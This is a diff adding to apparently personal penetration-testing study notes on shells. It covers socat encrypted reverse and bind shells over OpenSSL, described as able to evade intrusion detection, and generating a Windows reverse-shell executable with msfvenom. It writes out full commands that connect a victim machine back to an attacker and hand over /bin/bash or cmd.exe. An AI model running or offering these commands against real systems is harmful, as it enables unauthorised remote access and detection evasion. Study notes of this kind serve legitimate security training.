@@ -59,13 +59,52 @@ Windows Target : `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
 
 Attacking machine : `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
 
+**encrypted shell**
 
+with socat we can create encrypted shell both blind and reverse. its able to bypass IDS. 
+
+syntax : replace `TCP` with `OPENSSL` in above syntax in encrypted shells.
+- generate a certificate :
+`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
+
+this will generate 2048 bit rsa key. 
+
+- need to merge the two created files into a single `.pem` file.
+
+`cat shell.key shell.crt > shell.pem`
+
+- set up reverse shell listener
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` 
+to connect from victim machine:
+`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
+
+- blind shell
+taget : `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
+attacker : `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
+
+*note : you have to transfer the cert file (pem)*
 
 ### Metasploit -- multi/handler
 The `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. 
 
+
 ### msfvenome
 part of msf framework but shipped as separate tool. Used to generate payloads.
+
+`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
+
+p: payload
+f : format (exe,sh)
+
+- naming convention
+`<OS>/<arch>/<payload>`
+
+The exception to this convention is Windows 32bit targets. For these, the arch is not specified, eg : `windows/shell_reverse_tcp`
+For a 64bit Windows target, the arch would be specified as normal (x64).
+
+stageless payload denoted `_` while staged payload denotes `/` between shell and reverse. eg :`shell_reverse_tcp` and `shell/reverse_tcp`
+
+list payloas : `msfvenom --list payloads`
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
